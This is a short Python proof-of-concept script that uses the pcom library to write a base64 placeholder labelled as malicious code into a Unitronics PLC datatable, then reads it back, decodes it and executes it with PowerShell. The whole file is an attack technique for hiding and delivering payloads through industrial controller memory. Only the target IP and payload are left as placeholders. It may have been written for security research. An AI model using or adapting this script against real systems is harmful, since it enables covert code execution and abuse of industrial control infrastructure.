from pcom import commands
from pcom.plc import EthernetPlc
import os
import base64
import subprocess, sys

with EthernetPlc(address=('<<IP>>', 20256)) as plc:
    table_structure = commands.datatables.DatatableStructure("My table", offset=19000, rows=1, columns=[
        commands.datatables.String(20),
        commands.datatables.Int(),
        commands.datatables.Int(),
        commands.datatables.Int(),
        commands.datatables.Int(),
        commands.datatables.Int(),
    ])

    rows = [
        ["<<Malicious_CODE_B64>>", [0], [0], [0], [0], [0]],
    ]
    c = commands.datatables.WriteDatatable(structure=table_structure, data=rows)
    try:
        plc.send(c)
    except datatables.WriteDatatableError as ex:
        print(ex)


plc = EthernetPlc(address=('<<IP>>', 20256)) 
    
try:
    plc.connect()
  # Leer Tablas
    table_structure = commands.datatables.DatatableStructure("My table", offset=19000, rows=50, columns=[
        commands.datatables.String(4),
    ])
    c = commands.datatables.ReadDatatable(structure=table_structure)
    res = plc.send(c)
    print(res)
    #print(res[0][0][0])
    res_malicious=base64.b64decode(str(res[0][0]+res[1][0]+res[2][0]+res[4][0]+res[5][0])).decode('ascii')
    print(res_malicious)
    p = subprocess.Popen(["powershell", res_malicious], stdout=subprocess.PIPE)
    print(p.communicate())

finally:  
    print("final")
    plc.close()

